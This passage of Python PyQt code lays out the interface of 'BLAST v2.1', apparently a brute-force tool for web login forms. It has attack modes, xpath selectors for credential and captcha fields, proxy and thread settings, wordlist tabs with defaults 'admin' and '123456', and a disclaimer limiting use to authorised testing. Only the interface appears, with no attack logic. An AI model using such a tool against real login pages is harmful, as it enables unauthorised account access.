        self.sd_sen_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_sen_lable.setGeometry(QtCore.QRect(10, 60, 90, 20))
        self.sd_sen_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_sen_lable.setObjectName("sd_sen_lable")
        self.sd_login_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_login_text.setGeometry(QtCore.QRect(120, 220, 140, 20))

        self.sd_login_text.setObjectName("sd_login_text")
        self.sd_name_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_name_lable.setGeometry(QtCore.QRect(10, 100, 90, 20))
        self.sd_name_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_name_lable.setObjectName("sd_name_lable")
        self.sd_sem_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_sem_text.setGeometry(QtCore.QRect(120, 60, 140, 20))

        self.sd_sem_text.setObjectName("sd_sem_text")
        self.sd_pass_lab = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_pass_lab.setGeometry(QtCore.QRect(10, 140, 90, 20))
        self.sd_pass_lab.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_pass_lab.setObjectName("sd_pass_lab")
        self.sd_proxy_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_proxy_text.setGeometry(QtCore.QRect(390, 60, 140, 20))

        self.sd_proxy_text.setObjectName("sd_proxy_text")
        self.sd_proxy_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_proxy_lable.setGeometry(QtCore.QRect(280, 60, 90, 20))
        self.sd_proxy_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_proxy_lable.setObjectName("sd_proxy_lable")
        self.sd_delay_text = QtWidgets.QLineEdit(self.BLAST_sd)
        self.sd_delay_text.setGeometry(QtCore.QRect(390, 100, 140, 20))

        self.sd_delay_text.setObjectName("sd_delay_text")
        self.sd_delay_lable = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_delay_lable.setGeometry(QtCore.QRect(280, 100, 90, 20))
        self.sd_delay_lable.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_delay_lable.setObjectName("sd_delay_lable")
        self.sd_start_run_loglabel = QtWidgets.QLabel(self.BLAST_sd)
        self.sd_start_run_loglabel.setGeometry(QtCore.QRect(10, 250, 161, 41))
        self.sd_start_run_loglabel.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.sd_start_run_loglabel.setObjectName("sd_start_run_loglabel")
        self.tabWidget_mode.addTab(self.BLAST_sd, "")
        self.start_button = QtWidgets.QPushButton(window)
        self.start_button.setGeometry(QtCore.QRect(610, 0, 90, 40))

        self.start_button.setObjectName("start_button")
        self.result_text = QtWidgets.QTextBrowser(window)
        self.result_text.setGeometry(QtCore.QRect(-5, 480, 1241, 411))
        self.result_text.setObjectName("result_text")
        self.export_button = QtWidgets.QPushButton(window)
        self.export_button.setGeometry(QtCore.QRect(970, 0, 90, 40))

        self.export_button.setObjectName("export_button")
        self.tabWidget_user_passwd = QtWidgets.QTabWidget(window)
        self.tabWidget_user_passwd.setGeometry(QtCore.QRect(680, 50, 561, 261))

        self.tabWidget_user_passwd.setObjectName("tabWidget_user_passwd")
        self.tab_user = QtWidgets.QWidget()
        self.tab_user.setContextMenuPolicy(QtCore.Qt.ContextMenuPolicy.PreventContextMenu)
        self.tab_user.setObjectName("tab_user")
        self.Load_file_button_user = QtWidgets.QPushButton(self.tab_user)
        self.Load_file_button_user.setGeometry(QtCore.QRect(10, 70, 80, 30))

        self.Load_file_button_user.setObjectName("Load_file_button_user")
        self.Clear_list_button_user = QtWidgets.QPushButton(self.tab_user)
        self.Clear_list_button_user.setGeometry(QtCore.QRect(10, 120, 80, 30))

        self.Clear_list_button_user.setObjectName("Clear_list_button_user")
        self.password_result_text_user = QtWidgets.QTextBrowser(self.tab_user)
        self.password_result_text_user.setGeometry(QtCore.QRect(120, 10, 250, 160))
        self.password_result_text_user.setObjectName("password_result_text_user")
        self.Paste_text_button_user = QtWidgets.QPushButton(self.tab_user)
        self.Paste_text_button_user.setGeometry(QtCore.QRect(10, 20, 80, 30))

        self.Paste_text_button_user.setObjectName("Paste_text_button_user")
        self.add_text_add_user = QtWidgets.QLineEdit(self.tab_user)
        self.add_text_add_user.setGeometry(QtCore.QRect(120, 190, 250, 30))
        self.add_text_add_user.setObjectName("add_text_add_user")
        self.add_text_button_user = QtWidgets.QPushButton(self.tab_user)
        self.add_text_button_user.setGeometry(QtCore.QRect(10, 190, 80, 30))

        self.add_text_button_user.setObjectName("add_text_button_user")
        self.tabWidget_user_passwd.addTab(self.tab_user, "")
        self.tab_pass = QtWidgets.QWidget()
        self.tab_pass.setObjectName("tab_pass")
        self.Paste_text_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.Paste_text_button_pass.setGeometry(QtCore.QRect(10, 20, 80, 30))

        self.Paste_text_button_pass.setObjectName("Paste_text_button_pass")
        self.Load_file_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.Load_file_button_pass.setGeometry(QtCore.QRect(10, 70, 80, 30))

        self.Load_file_button_pass.setObjectName("Load_file_button_pass")
        self.Clear_list_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.Clear_list_button_pass.setGeometry(QtCore.QRect(10, 120, 80, 30))

        self.Clear_list_button_pass.setObjectName("Clear_list_button_pass")
        self.add_text_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.add_text_button_pass.setGeometry(QtCore.QRect(10, 190, 80, 30))

        self.add_text_button_pass.setObjectName("add_text_button_pass")
        self.password_result_text_pass = QtWidgets.QTextBrowser(self.tab_pass)
        self.password_result_text_pass.setGeometry(QtCore.QRect(120, 10, 250, 160))
        self.password_result_text_pass.setObjectName("password_result_text_pass")
        self.add_text_add_pass = QtWidgets.QLineEdit(self.tab_pass)
        self.add_text_add_pass.setGeometry(QtCore.QRect(120, 190, 250, 30))
        self.add_text_add_pass.setObjectName("add_text_add_pass")
        self.tabWidget_user_passwd.addTab(self.tab_pass, "")
        self.suspended_button = QtWidgets.QPushButton(window)
        self.suspended_button.setGeometry(QtCore.QRect(730, 0, 90, 40))

        self.suspended_button.setObjectName("suspended_button")
        self.restart_button = QtWidgets.QPushButton(window)
        self.restart_button.setGeometry(QtCore.QRect(850, 0, 90, 40))

        self.restart_button.setObjectName("restart_button")
        self.announcement = QtWidgets.QTextBrowser(window)
        self.announcement.setEnabled(False)
        self.announcement.setGeometry(QtCore.QRect(680, 350, 561, 131))

        self.announcement.setReadOnly(True)
        self.announcement.setObjectName("announcement")

        self.retranslateUi(window)
        self.tabWidget_mode.setCurrentIndex(0)
        self.tabWidget_user_passwd.setCurrentIndex(1)
        QtCore.QMetaObject.connectSlotsByName(window)

    def retranslateUi(self, window):
        _translate = QtCore.QCoreApplication.translate
        window.setWindowTitle(_translate("window", "BLAST v2.1"))
        self.target_url.setText(_translate("window", "http://127.0.0.1/login.php"))
        self.zd_mode_list.addItem(_translate("window", "sniper:狙击手"))
        self.zd_mode_list.addItem(_translate("window", "ram:攻城锤"))
        self.zd_mode_list.addItem(_translate("window", "fork:草叉模式"))
        self.zd_mode_list.addItem(_translate("window", "bomb:集束炸弹"))
        self.zd_mode_list.addItem(_translate("window", "jietu:截图"))
        self.zd_lable_mode.setText(_translate("window", "爆破模式"))
        self.zd_browser_label.setText(_translate("window", "浏览器"))
        self.zd_delay_lable.setText(_translate("window", "延迟关闭"))
        self.zd_delay_text.setText(_translate("window", "1"))
        self.zd_start_run_loglabel.setText(_translate("window", "程序启动日志"))
        self.zd_browser_button.setText(_translate("window", "False"))
        self.zd_yzm_text.setText(_translate("window", "验证码错误"))
        self.zd_yzm_lable.setText(_translate("window", "验证码错误关键词"))
        self.zd_proxy_label.setText(_translate("window", "网页代理"))
        self.zd_sem_label.setText(_translate("window", "线程设置"))
        self.zd_proxy_text.setText(_translate("window", "127.0.0.1:7890"))
        self.zd_sem_text.setText(_translate("window", "1"))
        self.tabWidget_mode.setTabText(self.tabWidget_mode.indexOf(self.BLASt_zd), _translate("window", "自动模式"))
        self.sd_yzm_lab.setText(_translate("window", "验证码错误关键词"))
        self.sd_yzm_text.setText(_translate("window", "验证码不正确"))
        self.sd_mode_lable.setText(_translate("window", "爆破模式"))
        self.sd_mode_list.setItemText(0, _translate("window", "sniper:狙击手"))
        self.sd_user_text.setText(_translate("window", "xpath"))
        self.sd_yzm_lable.setText(_translate("window", "验证码"))
        self.sd_pass_text.setText(_translate("window", "xpath"))
        self.sd_login_lable.setText(_translate("window", "登录提交"))
        self.sd_yzmpath_text.setText(_translate("window", "xpath"))
        self.sd_browser_lable.setText(_translate("window", "浏览器"))
        self.sd_browser_button.setText(_translate("window", "False"))
        self.sd_sen_lable.setText(_translate("window", "线程设置"))
        self.sd_login_text.setText(_translate("window", "xpath"))
        self.sd_name_lable.setText(_translate("window", "用户名"))
        self.sd_sem_text.setText(_translate("window", "1"))
        self.sd_pass_lab.setText(_translate("window", "密码"))
        self.sd_proxy_text.setText(_translate("window", "127.0.0.1:7890"))
        self.sd_proxy_lable.setText(_translate("window", "网页代理"))
        self.sd_delay_text.setText(_translate("window", "2"))
        self.sd_delay_lable.setText(_translate("window", "延迟关闭"))
        self.sd_start_run_loglabel.setText(_translate("window", "程序启动日志"))
        self.tabWidget_mode.setTabText(self.tabWidget_mode.indexOf(self.BLAST_sd), _translate("window", "手动选择"))
        self.start_button.setText(_translate("window", "开始爆破"))
        self.export_button.setText(_translate("window", "导出数据"))
        self.suspended_button.setText(_translate("window", "暂停爆破"))
        self.restart_button.setText(_translate("window", "重启爆破"))
        self.Load_file_button_user.setText(_translate("window", "Load"))
        self.Clear_list_button_user.setText(_translate("window", "Clear"))
        self.password_result_text_user.setText("admin")
        self.Paste_text_button_user.setText(_translate("window", "Paste"))
        self.add_text_button_user.setText(_translate("window", "Add"))
        self.tabWidget_user_passwd.setTabText(self.tabWidget_user_passwd.indexOf(self.tab_user),
                                              _translate("window", "用户名"))
        self.Paste_text_button_pass.setText(_translate("window", "Paste"))
        self.Load_file_button_pass.setText(_translate("window", "Load"))
        self.Clear_list_button_pass.setText(_translate("window", "Clear"))
        self.add_text_button_pass.setText(_translate("window", "Add"))
        self.password_result_text_pass.setText("123456")
        self.tabWidget_user_passwd.setTabText(self.tabWidget_user_passwd.indexOf(self.tab_pass),
                                              _translate("window", "密码"))

        self.announcement.setText(
            "本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。")


if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    app.setStyleSheet(qdarktheme.load_stylesheet())
    loop = qasync.QEventLoop(app)
    asyncio.set_event_loop(loop)
    mainwindows = QMainWindow()
    with loop:
        ui = Ui_window()
        ui.setui_text(mainwindows)
        mainwindows.show()
        loop.run_forever()
